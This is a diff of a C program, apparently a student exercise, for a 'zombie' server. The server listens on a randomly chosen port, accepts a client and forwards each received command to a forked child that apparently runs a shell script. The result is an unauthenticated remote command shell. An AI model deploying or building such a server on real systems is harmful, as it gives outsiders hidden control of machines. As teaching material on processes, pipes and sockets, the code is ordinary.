@@ -3,14 +3,14 @@
 #include <unistd.h>
 
 #include "utils_v2.h"
+#include "zombie.h"
 
 #define BACKLOG 5
-#define PORT 9090
 
 #define BUFFER_SZ 255
 #define BASH "programme_inoffensif.sh"
 
-void child (void *pipe, void *socket) {
+void child(void *pipe, void *socket) {
   int *pipefd = pipe;
   int *socketfd = socket;
 
@@ -40,34 +40,42 @@ void child (void *pipe, void *socket) {
 int main(int argc, char *arg[]) {
   // socket creation
   int sockfd = ssocket();
+
+  int random = randomIntBetween(0, NBR_PORTS - 1);
+  unsigned short PORT = PORT_TABLE[random];
+
   sbind(PORT, sockfd);
   slisten(sockfd, BACKLOG);
   printf("Le serveur tourne sur le port %d\n", PORT);
 
-  // accept controller connection
+  // accept client connection
   int newsockfd = saccept(sockfd);
+  printf("Client connected.\n");
 
-  // read message from controller
-  char bufRd[BUFFER_SZ];
-  int nbCharRd = sread(newsockfd, bufRd, BUFFER_SZ);
-  printf("Valeur reçue : %s\n", bufRd);
+  while (1) {
+    // read messages from client
+    char bufRd[BUFFER_SZ];
+    int nbCharRd;
+    do {
+      nbCharRd = sread(newsockfd, bufRd, BUFFER_SZ);
+      printf("Command received: %s\n", bufRd);
 
-  int pipefd[2];
-  spipe(pipefd);
-  fork_and_run2(child, pipefd, &newsockfd);
+      int pipefd[2];
+      spipe(pipefd);
+      fork_and_run2(child, pipefd, &newsockfd);
 
-  sclose(pipefd[0]);
+      sclose(pipefd[0]);
 
-  // write message in pipe
-  while (nbCharRd > 0) {
-    swrite(pipefd[1], bufRd, nbCharRd);
-    nbCharRd = sread(newsockfd, bufRd, BUFFER_SZ);
+      swrite(pipefd[1], bufRd, nbCharRd);
+
+      sclose(pipefd[1]);
+    } while (nbCharRd > 0);
   }
 
-  sclose(pipefd[1]);
-
-  // close connection client
+  // close connection to client
   sclose(newsockfd);
+  printf("Client disconnected.\n");
+
   // close listen socket
   sclose(sockfd);
 }
